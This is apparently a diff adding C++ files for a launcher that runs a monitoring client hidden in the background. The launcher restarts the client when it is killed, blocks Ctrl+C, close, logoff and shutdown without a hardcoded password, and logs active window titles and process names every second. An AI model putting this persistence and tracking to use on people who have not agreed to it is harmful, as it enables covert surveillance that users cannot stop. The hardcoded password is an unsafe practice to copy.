+      cout << "Example: ./launcher 192.168.1.50 8080 bscs24009" <<   endl;
+      cout << "\nFeatures:" <<   endl;
+      cout << "  ✓ Exit protection (password required)" <<   endl;
+      cout << "  ✓ Ctrl+C interception" <<   endl;
+      cout << "  ✓ Signal handler protection" <<   endl;
+      cout << "  ✓ Terminal close protection" <<   endl;
+      cout << "═══════════════════════════════════════════════════════" <<   endl;
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        printUsage();
+        return 1;
+    }
+
+      string server_ip = argv[1];
+      string port = argv[2];
+      string client_id = argv[3];
+
+      cout << "\n🚀 PROTECTED CLIENT LAUNCHER" <<   endl;
+      cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+      cout << "Target Server: " << server_ip << ":" << port <<   endl;
+      cout << "Client ID: " << client_id <<   endl;
+      cout << "Protection: ACTIVE 🛡️\n" <<   endl;
+
+    // Assume client binary is in the same directory
+      string client_exe = "./client";
+      string client_args = server_ip + " " + port + " " + client_id + " --guardian";
+
+    try {
+        LauncherConfig config(client_exe, server_ip,   stoi(port), client_id);
+        ProcessGuardLinux guard(config.exit_authorized);
+
+        if (!guard.launchClient(client_exe, client_args)) {
+              cerr << "❌ Failed to launch protected client" <<   endl;
+            return 1;
+        }
+
+        // Monitor the client process
+        guard.monitorProcess();
+
+          cout << "\n✅ Guardian shutdown complete" <<   endl;
+
+    } catch (const   exception& e) {
+          cerr << "❌ Error: " << e.what() <<   endl;
+        return 1;
+    }
+
+    return 0;
+}
+
+#endif // PLATFORM_LINUX
+===== FILE: ./process_guard_windows.hpp =====
+#ifndef PROCESS_GUARD_WINDOWS_HPP
+#define PROCESS_GUARD_WINDOWS_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <string>
+#include <iostream>
+#include <atomic>
+#include "launcher_common.hpp"
+#include "password_dialog_windows.hpp"
+using namespace std; 
+
+class ProcessGuardWindows {
+private:
+    PROCESS_INFORMATION processInfo;
+    HANDLE jobObject;
+      atomic<bool>& exit_authorized;
+    static ProcessGuardWindows* instance_;
+    
+public:
+    ProcessGuardWindows(  atomic<bool>& auth) 
+        : processInfo{0}, jobObject(NULL), exit_authorized(auth) {
+        instance_ = this;
+        ZeroMemory(&processInfo, sizeof(processInfo));
+    }
+    
+    ~ProcessGuardWindows() {
+        cleanup();
+        instance_ = nullptr;
+    }
+    
+    bool launchClient(const   string& executable, const   string& args) {
+          cout << "🛡️  Guardian: Launching protected client..." <<   endl;
+        
+        // Install console control handler for Ctrl+C, Ctrl+Break, Close
+        if (!SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE)) {
+              cerr << "⚠️  Warning: Failed to install console handler" <<   endl;
+        }
+        
+        // Create job object to tie child process lifecycle to parent
+        jobObject = CreateJobObjectA(NULL, NULL);
+        if (jobObject) {
+            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {0};
+            jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
+            
+            SetInformationJobObject(jobObject, JobObjectExtendedLimitInformation,
+                                   &jeli, sizeof(jeli));
+        }
+        
+        // Build command line
+          string cmdLine = executable + " " + args;
+        char* cmdLineBuffer = new char[cmdLine.length() + 1];
+        strcpy_s(cmdLineBuffer, cmdLine.length() + 1, cmdLine.c_str());
+        
+        // Create process WITHOUT new console - inherit parent's console
+        STARTUPINFOA si = {0};
+        si.cb = sizeof(si);
+        
+        BOOL success = CreateProcessA(
+            NULL,
+            cmdLineBuffer,
+            NULL, NULL, 
+            TRUE,  // Inherit handles
+            0,     // No special flags - use parent's console
+            NULL, NULL,
+            &si, &processInfo
+        );
+        
+        delete[] cmdLineBuffer;
+        
+        if (!success) {
+            DWORD error = GetLastError();
+              cerr << "❌ Failed to launch client. Error code: " << error <<   endl;
+            return false;
+        }
+        
+        // Assign to job object
+        if (jobObject) {
+            if (!AssignProcessToJobObject(jobObject, processInfo.hProcess)) {
+                  cerr << "⚠️  Warning: Failed to assign process to job object" <<   endl;
+            }
+        }
+        
+          cout << "✅ Client launched successfully under protection (PID: " 
+                  << processInfo.dwProcessId << ")" <<   endl;
+          cout << "🔒 Exit protection active - password required to exit" <<   endl;
+        
+        return true;
+    }
+    
+    void monitorProcess() {
+          cout << "\n🔍 Guardian: Monitoring client process..." <<   endl;
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" <<   endl;
+          cout << "Press Ctrl+C or close window to test exit protection" <<   endl;
+          cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+        
+        // Wait for process to exit or authorization
+        while (true) {
+            DWORD waitResult = WaitForSingleObject(processInfo.hProcess, 1000);
+            
+            if (waitResult == WAIT_OBJECT_0) {
+                // Process exited
+                DWORD exitCode;
+                GetExitCodeProcess(processInfo.hProcess, &exitCode);
+                
+                if (exit_authorized) {
+                      cout << "✅ Authorized exit - Guardian shutting down" <<   endl;
+                } else {
+                      cout << "⚠️  Client process terminated unexpectedly!" <<   endl;
+                      cout << "Exit code: " << exitCode <<   endl;
+                }
+                break;
+            }
+            
+            // Check if we should exit
+            if (exit_authorized) {
+                  cout << "🛑 Terminating client process..." <<   endl;
+                TerminateProcess(processInfo.hProcess, 0);
+                WaitForSingleObject(processInfo.hProcess, 2000);
+                  cout << "✅ Client terminated" <<   endl;
+                break;
+            }
+        }
+    }
+    
+private:
+    void cleanup() {
+        if (jobObject) {
+            CloseHandle(jobObject);
+            jobObject = NULL;
+        }
+        
+        if (processInfo.hProcess) {
+            CloseHandle(processInfo.hProcess);
+            CloseHandle(processInfo.hThread);
+            ZeroMemory(&processInfo, sizeof(processInfo));
+        }
+        
+        SetConsoleCtrlHandler(ConsoleCtrlHandler, FALSE);
+    }
+    
+    static BOOL WINAPI ConsoleCtrlHandler(DWORD ctrlType) {
+        const char* eventName = "UNKNOWN";
+        
+        switch (ctrlType) {
+            case CTRL_C_EVENT:
+                eventName = "Ctrl+C";
+                break;
+            case CTRL_BREAK_EVENT:
+                eventName = "Ctrl+Break";
+                break;
+            case CTRL_CLOSE_EVENT:
+                eventName = "Console Close";
+                break;
+            case CTRL_LOGOFF_EVENT:
+                eventName = "User Logoff";
+                break;
+            case CTRL_SHUTDOWN_EVENT:
+                eventName = "System Shutdown";
+                break;
+        }
+        
+          cout << "\n\n🚨 Exit attempt detected: " << eventName <<   endl;
+        
+        if (instance_) {
+            return instance_->handleExitAttempt() ? TRUE : FALSE;
+        }
+        
+        return FALSE; // Allow default handling if no instance
+    }
+    
+    bool handleExitAttempt() {
+          cout << "🔐 Password authentication required..." <<   endl;
+        
+        if (PasswordDialogWindows::showPasswordDialog()) {
+              cout << "\n✅ Password correct - Exit authorized" <<   endl;
+            exit_authorized = true;
+            
+            // Terminate child process
+            if (processInfo.hProcess) {
+                  cout << "🛑 Terminating client process..." <<   endl;
+                TerminateProcess(processInfo.hProcess, 0);
+                WaitForSingleObject(processInfo.hProcess, 2000);
+            }
+            
+            // Exit the guardian
+              cout << "✅ Guardian shutdown complete" <<   endl;
+            ExitProcess(0);
+            
+            return false; // Should not reach here
+        } else {
+            showUnauthorizedMessage();
+              cout << "🔄 Continue working... (Ctrl+C again to retry exit)\n" <<   endl;
+            return true; // Block exit
+        }
+    }
+};
+
+ProcessGuardWindows* ProcessGuardWindows::instance_ = nullptr;
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./window_monitor.hpp =====
+#ifndef WINDOW_MONITOR_HPP
+#define WINDOW_MONITOR_HPP
+
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <X11/Xatom.h>
+#include <iostream>
+#include <string>
+#include <thread>
+#include <atomic>
+#include <functional>
+#include <cstring>
+#include <fstream>
+#include <algorithm>
+using namespace std;
+class WindowMonitor
+{
+private:
+    atomic<bool> monitoring_;
+    thread monitor_thread_;
+    function<void(const string &)> callback_;
+    Display *display_;
+    Window root_window_;
+    string last_window_title_;
+    static constexpr int CHECK_INTERVAL_MS = 1000; // Check every second
+
+public:
+    WindowMonitor(function<void(const string &)> callback)
+        : monitoring_(false), callback_(callback), display_(nullptr), root_window_(0) {}
+
+    ~WindowMonitor()
+    {
+        stop();
+    }
+
+    bool start()
+    {
+        if (monitoring_)
+        {
+            return false;
+        }
+
+        // Initialize X11 display
+        display_ = XOpenDisplay(nullptr);
+        if (!display_)
+        {
+            cerr << "Failed to open X11 display for window monitoring." << endl;
+            return false;
+        }
+
+        root_window_ = DefaultRootWindow(display_);
+        monitoring_ = true;
+        monitor_thread_ = thread(&WindowMonitor::monitorLoop, this);
+
+        cout << "Window monitoring started" << endl;
+        return true;
+    }
+
+    void stop()
+    {
+        monitoring_ = false;
+        if (monitor_thread_.joinable())
+        {
+            monitor_thread_.join();
+        }
+        if (display_)
+        {
+            XCloseDisplay(display_);
+            display_ = nullptr;
+        }
+        cout << "Window monitoring stopped" << endl;
+    }
+
+    bool isMonitoring() const
+    {
+        return monitoring_;
+    }
+
+private:
+    void monitorLoop()
+    {
+        // Get initial window
+        string initial_window = getActiveWindowTitle();
+        if (!initial_window.empty())
+        {
+            last_window_title_ = initial_window;
+            if (callback_)
+            {
+                callback_("WINDOW: " + initial_window);
+            }
+        }
+
+        while (monitoring_)
+        {
+            string current_window = getActiveWindowTitle();
+
+            if (!current_window.empty() && current_window != last_window_title_)
+            {
+                cout << "Window changed to: " << current_window << endl;
+
+                if (callback_)
+                {
+                    callback_("WINDOW: " + current_window);
+                }
+
+                last_window_title_ = current_window;
+            }
+
+            this_thread::sleep_for(chrono::milliseconds(CHECK_INTERVAL_MS));
+        }
+    }
+
+    string getActiveWindowTitle()
+    {
+        if (!display_)
+        {
+            return "";
+        }
+
+        Window focused_window;
+        int revert_to;
+
+        // Get currently focused window
+        if (XGetInputFocus(display_, &focused_window, &revert_to) == 0)
+        {
+            return "";
+        }
+
+        // If we get the root window, try another method
+        if (focused_window == root_window_)
+        {
+            // Use _NET_ACTIVE_WINDOW property
+            Atom active_window_atom = XInternAtom(display_, "_NET_ACTIVE_WINDOW", False);
+            Atom type;
+            int format;
+            unsigned long nitems, bytes_after;
+            unsigned char *data = nullptr;
+
+            if (XGetWindowProperty(display_, root_window_, active_window_atom,
+                                   0, 1024, False, XA_WINDOW,
+                                   &type, &format, &nitems, &bytes_after,
+                                   &data) == Success &&
+                data)
+            {
+                if (nitems > 0)
+                {
+                    focused_window = *((Window *)data);
+                }
+                XFree(data);
+            }
+        }
+
+        if (focused_window == None || focused_window == root_window_)
+        {
+            return "Unknown Window";
+        }
+
+        // Get window title using _NET_WM_NAME (UTF-8)
+        string title = getWindowProperty(focused_window, "_NET_WM_NAME");
+        if (title.empty())
+        {
+            // Fallback to WM_NAME (legacy)
+            title = getWindowProperty(focused_window, "WM_NAME");
+        }
+
+        // Get process name if available
+        string process_name = getWindowProcessName(focused_window);
+
+        string result;
+        if (!title.empty())
+        {
+            result = title;
+            if (!process_name.empty())
+            {
+                result += " [" + process_name + "]";
+            }
+        }
+        else if (!process_name.empty())
+        {
+            result = process_name;
+        }
+        else
+        {
+            result = "Window " + to_string((unsigned long)focused_window);
+        }
+
+        // Clean up the string
+        result.erase(remove_if(result.begin(), result.end(),
+                               [](char c)
+                               {
+                                   return (c < 32 && c != '\n' && c != '\t') || c == 127;
+                               }),
+                     result.end());
+
+        return result;
+    }
+
+    string getWindowProperty(Window window, const char *property_name)
+    {
+        Atom property_atom = XInternAtom(display_, property_name, False);
+        Atom type;
+        int format;
+        unsigned long nitems, bytes_after;
+        unsigned char *data = nullptr;
+
+        string result;
+
+        if (XGetWindowProperty(display_, window, property_atom,
+                               0, 1024, False, AnyPropertyType,
+                               &type, &format, &nitems, &bytes_after,
+                               &data) == Success &&
+            data && nitems > 0)
+        {
+
+            if (format == 8)
+            { // String format
+                result = string(reinterpret_cast<char *>(data), nitems);
+            }
+
+            XFree(data);
+        }
+
+        return result;
+    }
+
+    string getWindowProcessName(Window window)
+    {
+        // Try to get process ID and name using _NET_WM_PID
+        Atom pid_atom = XInternAtom(display_, "_NET_WM_PID", False);
+        Atom type;
+        int format;
+        unsigned long nitems, bytes_after;
+        unsigned char *data = nullptr;
+
+        string process_name;
+
+        if (XGetWindowProperty(display_, window, pid_atom,
+                               0, 1, False, XA_CARDINAL,
+                               &type, &format, &nitems, &bytes_after,
+                               &data) == Success &&
+            data && nitems > 0)
+        {
+
+            if (format == 32)
+            {
+                pid_t pid = *((pid_t *)data);
+
+                // Try to get process name from /proc
+                string proc_path = "/proc/" + to_string(pid) + "/comm";
+                ifstream proc_file(proc_path);
+                if (proc_file)
+                {
+                    getline(proc_file, process_name);
+                }
+            }
+
+            XFree(data);
+        }
+
+        return process_name;
+    }
+};
+
+#endif
+===== FILE: ./password_dialog_windows.hpp =====
+#ifndef PASSWORD_DIALOG_WINDOWS_HPP
+#define PASSWORD_DIALOG_WINDOWS_HPP
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <string>
+#include <iostream>
+#include <conio.h>
+#include "launcher_common.hpp"
+using namespace std; 
+class PasswordDialogWindows {
+public:
+    static bool showPasswordDialog() {
+          cout << "\n╔════════════════════════════════════════╗" <<   endl;
+          cout << "║  EXIT AUTHORIZATION REQUIRED          ║" <<   endl;
+          cout << "╚════════════════════════════════════════╝" <<   endl;
+          cout << "Enter password to stop monitoring: ";
+        
+          string password = getPasswordInput();
+          cout <<   endl;
+        
+        return verifyPassword(password);
+    }
+    
+private:
+    static   string getPasswordInput() {
+          string password;
+        char ch;
+        
+        while (true) {
+            ch = _getch();
+            
+            if (ch == '\r' || ch == '\n') { // Enter key
+                break;
+            } else if (ch == '\b' || ch == 127) { // Backspace
+                if (!password.empty()) {
+                    password.pop_back();
+                      cout << "\b \b"; // Erase character from display
+                }
+            } else if (ch >= 32 && ch <= 126) { // Printable characters only
+                password += ch;
+                  cout << '*'; // Show asterisk
+            }
+        }
+        
+        return password;
+    }
+};
+
+#endif // PLATFORM_WINDOWS
+#endif
+===== FILE: ./launcher_windows_simple.cpp =====
+
+// Simple background monitoring - No window protection, just process monitoring
+
+#include "platform_detector.hpp"
+
+#ifdef PLATFORM_WINDOWS
+
+#include <windows.h>
+#include <iostream>
+#include <string>
+#include <atomic>
+#include <thread>
+#include <conio.h>
+#include "launcher_common.hpp"
+#include "password_dialog_windows.hpp"
+using namespace std; 
+  atomic<bool> exit_authorized(false);
+  atomic<bool> monitoring(true);
+PROCESS_INFORMATION clientProcess = {0};
+
+bool launchClientHidden(const   string& exe, const   string& args) {
+      string cmdLine = exe + " " + args;
+    char* cmdBuffer = new char[cmdLine.length() + 1];
+    strcpy_s(cmdBuffer, cmdLine.length() + 1, cmdLine.c_str());
+    
+    STARTUPINFOA si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;  // HIDE the client console
+    
+    BOOL success = CreateProcessA(
+        NULL, cmdBuffer,
+        NULL, NULL, FALSE,
+        CREATE_NEW_CONSOLE | CREATE_NO_WINDOW,  // Hidden console
+        NULL, NULL, &si, &clientProcess
+    );
+    
+    delete[] cmdBuffer;
+    return success == TRUE;
+}
+
+void inputThread() {
+      cout << "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" <<   endl;
+      cout << "COMMANDS:" <<   endl;
+      cout << "  exit   - Stop monitoring (requires password)" <<   endl;
+      cout << "  status - Check client status" <<   endl;
+      cout << "  show   - Show client console (if hidden)" <<   endl;
+      cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+    
+      string input;
+    while (monitoring) {
+          cout << "> ";
+          getline(  cin, input);
+        
+        if (input == "exit" || input == "quit") {
+              cout << "\n🔐 Password authentication required..." <<   endl;
+            
+            if (PasswordDialogWindows::showPasswordDialog()) {
+                  cout << "✅ Password correct - Stopping monitoring..." <<   endl;
+                exit_authorized = true;
+                monitoring = false;
+                break;
+            } else {
+                  cout << "❌ INCORRECT PASSWORD!" <<   endl;
+                  cout << "   Monitoring continues...\n" <<   endl;
+            }
+        } else if (input == "status") {
+            if (clientProcess.hProcess) {
+                DWORD exitCode;
+                GetExitCodeProcess(clientProcess.hProcess, &exitCode);
+                if (exitCode == STILL_ACTIVE) {
+                      cout << "✅ Client is running (PID: " << clientProcess.dwProcessId << ")" <<   endl;
+                      cout << "🔒 Background monitoring: ACTIVE" <<   endl;
+                } else {
+                      cout << "⚠️  Client is not running" <<   endl;
+                }
+            }
+        } else if (input == "show") {
+              cout << "ℹ️  Client runs in background - no console to show" <<   endl;
+        } else if (!input.empty()) {
+              cout << "Unknown command. Type 'exit', 'status', or 'show'." <<   endl;
+        }
+    }
+}
+
+void monitorClient(const   string& server_ip, const   string& port, 
+                   const   string& client_id) {
+    int restartCount = 0;
+    const int MAX_RESTARTS = 100;  // High number = keep trying
+    
+      string client_exe = "client.exe";
+      string client_args = server_ip + " " + port + " " + client_id + " --guardian";
+    
+    while (monitoring && !exit_authorized) {
+        DWORD waitResult = WaitForSingleObject(clientProcess.hProcess, 2000);
+        
+        if (waitResult == WAIT_OBJECT_0) {
+            // Process exited
+            DWORD exitCode;
+            GetExitCodeProcess(clientProcess.hProcess, &exitCode);
+            
+            CloseHandle(clientProcess.hProcess);
+            CloseHandle(clientProcess.hThread);
+            ZeroMemory(&clientProcess, sizeof(clientProcess));
+            
+            if (!exit_authorized) {
+                  cout << "\n⚠️  CLIENT TERMINATED! (Exit code: " << exitCode << ")" <<   endl;
+                
+                if (restartCount < MAX_RESTARTS) {
+                      cout << "🔄 Restarting in 3 seconds... (attempt " 
+                              << (restartCount + 1) << "/" << MAX_RESTARTS << ")" <<   endl;
+                    
+                      this_thread::sleep_for(  chrono::seconds(3));
+                    
+                    if (launchClientHidden(client_exe, client_args)) {
+                          cout << "✅ Client restarted (PID: " << clientProcess.dwProcessId << ")" <<   endl;
+                        restartCount++;
+                    } else {
+                          cout << "❌ Failed to restart client" <<   endl;
+                          this_thread::sleep_for(  chrono::seconds(5));
+                    }
+                } else {
+                      cout << "❌ Maximum restart attempts reached" <<   endl;
+                    monitoring = false;
+                    break;
+                }
+            } else {
+                  cout << "✅ Authorized exit" <<   endl;
+                break;
+            }
+        }
+    }
+    
+    // Final cleanup
+    if (clientProcess.hProcess) {
+          cout << "🛑 Terminating client..." <<   endl;
+        TerminateProcess(clientProcess.hProcess, 0);
+        WaitForSingleObject(clientProcess.hProcess, 2000);
+        CloseHandle(clientProcess.hProcess);
+        CloseHandle(clientProcess.hThread);
+    }
+}
+
+int main(int argc, char* argv[]) {
+    SetConsoleOutputCP(CP_UTF8);
+    
+    if (argc != 4) {
+          cout << "Usage: launcher.exe <server_ip> <port> <client_id>" <<   endl;
+          cout << "Example: launcher.exe 192.168.100.8 8080 bscs24009" <<   endl;
+        return 1;
+    }
+    
+      string server_ip = argv[1];
+      string port = argv[2];
+      string client_id = argv[3];
+    
+      cout << "\n🛡️  PROTECTED CLIENT LAUNCHER (Background Mode)" <<   endl;
+      cout << "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" <<   endl;
+      cout << "Server: " << server_ip << ":" << port <<   endl;
+      cout << "Client ID: " << client_id <<   endl;
+    
+      string client_exe = "client.exe";
+      string client_args = server_ip + " " + port + " " + client_id + " --guardian";
+    
+      cout << "\n⏳ Launching client in background..." <<   endl;
+    
+    if (!launchClientHidden(client_exe, client_args)) {
+          cerr << "❌ Failed to launch client!" <<   endl;
+          cout << "Press any key to exit...";
+        _getch();
+        return 1;
+    }
+    
+      cout << "✅ Client launched (PID: " << clientProcess.dwProcessId << ")" <<   endl;
+      cout << "✅ Running in background (hidden console)" <<   endl;
+    
+      cout << "\n🔒 PROTECTION ACTIVE:" <<   endl;
+      cout << "   ✓ Client runs in background (no visible window)" <<   endl;
+      cout << "   ✓ Auto-restarts on crash (up to 100 times)" <<   endl;
+      cout << "   ✓ Password required to stop: 'exit' command" <<   endl;
+      cout << "   ✓ Alternative: Run guardian_exit.exe" <<   endl;
+    
+    // Start input handler
+      thread inputHandler(inputThread);
+    
+    // Monitor the client
+    monitorClient(server_ip, port, client_id);
+    
+    // Cleanup
+    monitoring = false;
+    if (inputHandler.joinable()) {
+        inputHandler.join();
+    }
+    
+      cout << "\n✅ Guardian shutdown complete" <<   endl;
+    return 0;
+}
+
+#endif // PLATFORM_WINDOWS
+===== FILE: ./launcher_common.hpp =====
+#ifndef LAUNCHER_COMMON_HPP
+#define LAUNCHER_COMMON_HPP
+
+#include <string>
+#include <atomic>
+#include <iostream>
+#include <fstream>
+using namespace std; 
+// Hardcoded password - CHANGE THIS before distributing!
+// For production, read from encrypted config or environment variable
+const   string GUARDIAN_PASSWORD = "abd101";
+
+class LauncherConfig {
+public:
+      string client_executable;
+      string server_ip;
+    int server_port;
+      string client_id;
+      atomic<bool> exit_authorized{false};
+    
+    LauncherConfig(const   string& exe, const   string& ip, 
+                   int port, const   string& id)
+        : client_executable(exe), server_ip(ip), 
+          server_port(port), client_id(id) {}
+};
+
+inline bool verifyPassword(const   string& input) {
+    return input == GUARDIAN_PASSWORD;
+}
+
+inline void showUnauthorizedMessage() {
+      cout << "\n❌ UNAUTHORIZED EXIT ATTEMPT DENIED!" <<   endl;
+      cout << "The monitoring session continues..." <<   endl;
+}
+
+#endif
+ 
+
+
+
+ 
